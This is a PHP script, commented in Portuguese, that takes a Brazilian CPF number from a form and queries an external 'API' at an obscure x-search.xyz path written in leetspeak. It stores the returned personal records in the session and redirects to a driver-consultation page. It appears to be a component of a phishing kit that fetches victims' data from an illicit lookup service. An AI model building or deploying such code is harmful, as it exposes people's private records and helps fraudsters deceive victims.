<?php
session_start(); // Inicia a sessão

// Configuração da URL da API
$apiUrl = "https://x-search.xyz/3nd-p01n75/xsiayer0-0t/lunder231224/r0070x/05/cpf.php?cpf="; // Substitua pela URL real da API

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cpf'])) {
    $cpf = preg_replace('/\D/', '', $_POST['cpf']); // Remove caracteres não numéricos

    if (strlen($cpf) === 11) {
        // Formata o CPF
        $cpfFormatado = formatarCpf($cpf);

        // Faz a consulta na API
        $response = consultarCpfNaApi($apiUrl, $cpf);

        if ($response) {
            $dados = json_decode($response, true);

            if (isset($dados['status']) && $dados['status'] === 1) {
                // Armazena os dados na sessão
                $_SESSION['dados_cpf'] = $dados['dados'];
                $_SESSION['cpf_formatado'] = $cpfFormatado; // Salva o CPF formatado na sessão

                // Redireciona para a página onde os dados serão exibidos
                header("Location: ./consultar/condutor.php");
                exit;
            } else {
                header("Location: ./entrar.html");
            }
        } else {
            header("Location: ./entrar.html");
        }
    } else {
        header("Location: ./entrar.html");
    }
} else {
    header("Location: ./entrar.html");
}

/**
 * Adiciona o CPF ao final da URL e consulta a API
 *
 * @param string $url URL base da API
 * @param string $cpf CPF a ser consultado
 * @return string|false Resposta da API ou false em caso de falha
 */
function consultarCpfNaApi($url, $cpf) {
    $urlComCpf = $url . urlencode($cpf);

    $options = [
        'http' => [
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method'  => 'GET',
        ],
    ];
    $context = stream_context_create($options);

    return @file_get_contents($urlComCpf, false, $context);
}

/**
 * Formata o CPF no formato XXX.XXX.XXX-XX
 *
 * @param string $cpf CPF apenas com números
 * @return string CPF formatado
 */
function formatarCpf($cpf) {
    return preg_replace("/(\d{3})(\d{3})(\d{3})(\d{2})/", "$1.$2.$3-$4", $cpf);
}

